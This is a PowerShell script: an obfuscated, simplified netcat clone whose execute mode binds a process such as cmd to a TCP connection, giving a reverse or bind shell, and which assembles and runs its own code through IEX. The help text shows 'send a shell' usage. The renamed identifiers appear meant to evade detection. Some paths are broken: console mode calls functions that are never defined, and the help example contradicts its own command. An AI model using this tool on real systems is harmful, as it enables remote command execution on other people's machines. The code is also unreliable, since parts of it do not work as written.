function a7k9
{
  param(
    [alias("Client")][string]$x2m="",
    [alias("Listen")][switch]$f9p=$False,
    [alias("Port")][Parameter(Position=-1)][string]$b3q="",
    [alias("Execute")][string]$w8n=""
  )
  
  ############### HELP ###############
  $j4r = "
a7k9 - Netcat, The Powershell Version (Simplified)

Usage: a7k9 [-x2m or -f9p] [-b3q port] [-w8n process]

  -x2m  <ip>      Client Mode. Provide the IP of the system you wish to connect to.
            
  -f9p            Listen Mode. Start a listener on the port specified by -b3q.
  
  -b3q  <port>    Port. The port to connect to, or the port to listen on.
  
  -w8n  <proc>    Execute. Specify the name of the process to start.

Examples:

  Listen on port 8000 and print the output to the console.
      a7k9 -f9p -b3q 8000
  
  Connect to 10.1.1.1 port 443 and send a shell.
      a7k9 -x2m localhost -b3q 443 -w8n cmd
"
  
  ############### VALIDATE ARGS ###############
  if((($x2m -eq "") -and (!$f9p)) -or (($x2m -ne "") -and $f9p)){return "You must select either client mode (-x2m) or listen mode (-f9p)."}
  if($b3q -eq ""){return "Please provide a port number to -b3q."}
  
  if($f9p)
  {
    $k5t = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $b3q){Write-Output ("The selected port " + $b3q + " is already in use.") ; $k5t=$True}}
    if($k5t){break}
  }
  ############### VALIDATE ARGS ###############
  
  ########## TCP FUNCTIONS ##########
  function d8z1
  {
    param($v6h)
    $x2m,$f9p,$b3q,$r7s = $v6h
    $m4l = @{}
    if(!$f9p)
    {
      $m4l["f9p"] = $False
      $n1u = New-Object System.Net.Sockets.TcpClient
      Write-Host "Connecting..."
      $y3e = $n1u.BeginConnect($x2m,$b3q,$null,$null)
    }
    else
    {
      $m4l["f9p"] = $True
      Write-Host ("Listening on [0.0.0.0] (port " + $b3q + ")")
      $n1u = New-Object System.Net.Sockets.TcpListener $b3q
      $n1u.Start()
      $y3e = $n1u.BeginAcceptTcpClient($null, $null)
    }
    
    $q9w = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
        {
          Write-Host "CTRL or ESC caught. Stopping TCP Setup..."
          if($m4l["f9p"]){$n1u.Stop()}
          else{$n1u.Close()}
          $q9w.Stop()
          break
        }
      }
      if($q9w.Elapsed.TotalSeconds -gt 60)
      {
        if(!$f9p){$n1u.Close()}
        else{$n1u.Stop()}
        $q9w.Stop()
        Write-Host "Timeout!" ; break
        break
      }
      if($y3e.IsCompleted)
      {
        if(!$f9p)
        {
          try
          {
            $n1u.EndConnect($y3e)
            $i5g = $n1u.GetStream()
            $p2c = $n1u.ReceiveBufferSize
            Write-Host ("Connection to " + $x2m + ":" + $b3q + " [tcp] succeeded!")
          }
          catch{$n1u.Close(); $q9w.Stop(); break}
        }
        else
        {
          $z8x = $n1u.EndAcceptTcpClient($y3e)
          $i5g = $z8x.GetStream()
          $p2c = $z8x.ReceiveBufferSize
          Write-Host ("Connection from [" + $z8x.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $b3q + " [tcp] accepted (source port " + $z8x.Client.RemoteEndPoint.Port + ")")
        }
        break
      }
    }
    $q9w.Stop()
    if($n1u -eq $null){break}
    $m4l["i5g"] = $i5g
    $m4l["n1u"] = $n1u
    $m4l["p2c"] = $p2c
    $m4l["a4f"] = (New-Object System.Byte[] $m4l["p2c"])
    $m4l["h7d"] = $m4l["i5g"].BeginRead($m4l["a4f"], 0, $m4l["p2c"], $null, $null)
    $m4l["t6y"] = New-Object System.Text.AsciiEncoding
    $m4l["l9k"] = 1
    return $m4l
  }
  function e3v8
  {
    param($m4l)
    $o2s = $null
    if($m4l["l9k"] -eq 0){break}
    if($m4l["h7d"].IsCompleted)
    {
      $u1j = $m4l["i5g"].EndRead($m4l["h7d"])
      if($u1j -eq 0){break}
      $o2s = $m4l["a4f"][0..([int]$u1j-1)]
      $m4l["h7d"] = $m4l["i5g"].BeginRead($m4l["a4f"], 0, $m4l["p2c"], $null, $null)
    }
    return $o2s,$m4l
  }
  function s6n2
  {
    param($o2s,$m4l)
    $m4l["i5g"].Write($o2s, 0, $o2s.Length)
    return $m4l
  }
  function g9f4
  {
    param($m4l)
    try{$m4l["i5g"].Close()}
    catch{}
    if($m4l["f9p"]){$m4l["n1u"].Stop()}
    else{$m4l["n1u"].Close()}
  }
  ########## TCP FUNCTIONS ##########
  
  ########## CMD FUNCTIONS ##########
  function c7b5
  {
    param($v6h)
    $m4l = @{}
    $x4z = New-Object System.Diagnostics.ProcessStartInfo
    $x4z.FileName = $v6h[0]
    $x4z.UseShellExecute = $False
    $x4z.RedirectStandardInput = $True
    $x4z.RedirectStandardOutput = $True
    $x4z.RedirectStandardError = $True
    $m4l["k8w"] = [System.Diagnostics.Process]::Start($x4z)
    Write-Host ("Starting Process " + $v6h[0] + "...")
    $m4l["k8w"].Start() | Out-Null
    $m4l["r3y"] = New-Object System.Byte[] 65536
    $m4l["v9m"] = $m4l["k8w"].StandardOutput.BaseStream.BeginRead($m4l["r3y"], 0, 65536, $null, $null)
    $m4l["q1p"] = New-Object System.Byte[] 65536
    $m4l["n5l"] = $m4l["k8w"].StandardError.BaseStream.BeginRead($m4l["q1p"], 0, 65536, $null, $null)
    $m4l["t6y"] = New-Object System.Text.AsciiEncoding
    return $m4l
  }
  function f2h9
  {
    param($m4l)
    [byte[]]$o2s = @()
    if($m4l["v9m"].IsCompleted)
    {
      $d7k = $m4l["k8w"].StandardOutput.BaseStream.EndRead($m4l["v9m"])
      if($d7k -eq 0){break}
      $o2s += $m4l["r3y"][0..([int]$d7k-1)]
      $m4l["v9m"] = $m4l["k8w"].StandardOutput.BaseStream.BeginRead($m4l["r3y"], 0, 65536, $null, $null)
    }
    if($m4l["n5l"].IsCompleted)
    {
      $w6x = $m4l["k8w"].StandardError.BaseStream.EndRead($m4l["n5l"])
      if($w6x -eq 0){break}
      $o2s += $m4l["q1p"][0..([int]$w6x-1)]
      $m4l["n5l"] = $m4l["k8w"].StandardError.BaseStream.BeginRead($m4l["q1p"], 0, 65536, $null, $null)
    }
    return $o2s,$m4l
  }
  function j8d3
  {
    param($o2s,$m4l)
    $m4l["k8w"].StandardInput.WriteLine($m4l["t6y"].GetString($o2s).TrimEnd("`r").TrimEnd("`n"))
    return $m4l
  }
  function y5a1
  {
    param($m4l)
    $m4l["k8w"] | Stop-Process
  }  
  ########## CMD FUNCTIONS ##########

  ########## CONSOLE FUNCTIONS ##########
  function h4u7
  {
    param($v6h)
    $m4l = @{}
    $m4l["t6y"] = New-Object System.Text.AsciiEncoding
    return $m4l
  }
  function z3p6
  {
    param($m4l)
    $o2s = $null
    if($Host.UI.RawUI.KeyAvailable)
    {
      $o2s = $m4l["t6y"].GetBytes((Read-Host) + "`n")
    }
    return $o2s,$m4l
  }
  function k9r2
  {
    param($o2s,$m4l)
    Write-Host -n $m4l["t6y"].GetString($o2s)
    return $m4l
  }
  function l6t8
  {
    param($m4l)
    return
  }
  ########## CONSOLE FUNCTIONS ##########
  
  ########## MAIN FUNCTION ##########
  function m1x5
  {
    param($i7q,$e9u)
    try
    {
      Write-Host "Setting up Stream 1..."
      try{$p8v = b4s1_d8z1 $i7q}
      catch{Write-Host "Stream 1 Setup Failure" ; return}
      
      Write-Host "Setting up Stream 2..."
      try{$a2n = b4s2_c7b5 $e9u}
      catch{Write-Host "Stream 2 Setup Failure" ; return}
      
      $o2s = $null
      
      Write-Host "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          $o2s,$a2n = b4s2_f2h9 $a2n
          if(($o2s.Length -eq 0) -or ($o2s -eq $null)){Start-Sleep -Milliseconds 100}
          if($o2s -ne $null){$p8v = b4s1_s6n2 $o2s $p8v}
          $o2s = $null
        }
        catch
        {
          Write-Host "Failed to redirect data from Stream 2 to Stream 1" ; return
        }
        
        try
        {
          $o2s,$p8v = b4s1_e3v8 $p8v
          if(($o2s.Length -eq 0) -or ($o2s -eq $null)){Start-Sleep -Milliseconds 100}
          if($o2s -ne $null){$a2n = b4s2_j8d3 $o2s $a2n}
          $o2s = $null
        }
        catch
        {
          Write-Host "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        b4s2_l6t8 $a2n
      }
      catch
      {
        Write-Host "Failed to close Stream 2"
      }
      try
      {
        b4s1_g9f4 $p8v
      }
      catch
      {
        Write-Host "Failed to close Stream 1"
      }
    }
  }
  ########## MAIN FUNCTION ##########
  
  ########## EXECUTION ##########
  # Set up TCP as Stream 1
  $v3k = ("function b4s1_d8z1`n{`n" + ${function:d8z1} + "`n}`n`n")
  $v3k += ("function b4s1_e3v8`n{`n" + ${function:e3v8} + "`n}`n`n")
  $v3k += ("function b4s1_s6n2`n{`n" + ${function:s6n2} + "`n}`n`n")
  $v3k += ("function b4s1_g9f4`n{`n" + ${function:g9f4} + "`n}`n`n")
  
  if($f9p){$q7w = "m1x5 @('',`$True,$b3q,60) "}
  else{$q7w = "m1x5 @('$x2m',`$False,$b3q,60) "}
  
  # Set up Stream 2 based on -w8n parameter
  if($w8n -ne "")
  {
    $v3k += ("function b4s2_c7b5`n{`n" + ${function:c7b5} + "`n}`n`n")
    $v3k += ("function b4s2_f2h9`n{`n" + ${function:f2h9} + "`n}`n`n")
    $v3k += ("function b4s2_j8d3`n{`n" + ${function:j8d3} + "`n}`n`n")
    $v3k += ("function b4s2_y5a1`n{`n" + ${function:y5a1} + "`n}`n`n")
    $q7w += "@('$w8n')`n`n"
  }
  else
  {
    $v3k += ("function b4s2_h4u7`n{`n" + ${function:h4u7} + "`n}`n`n")
    $v3k += ("function b4s2_z3p6`n{`n" + ${function:z3p6} + "`n}`n`n")
    $v3k += ("function b4s2_k9r2`n{`n" + ${function:k9r2} + "`n}`n`n")
    $v3k += ("function b4s2_l6t8`n{`n" + ${function:l6t8} + "`n}`n`n")
    $q7w += "@()"
  }
  
  $v3k += ("function m1x5`n{`n" + ${function:m1x5} + "`n}`n`n")
  $q7w = ($v3k + $q7w)
  
  # Execute the payload
  IEX $q7w
  ########## EXECUTION ##########
} 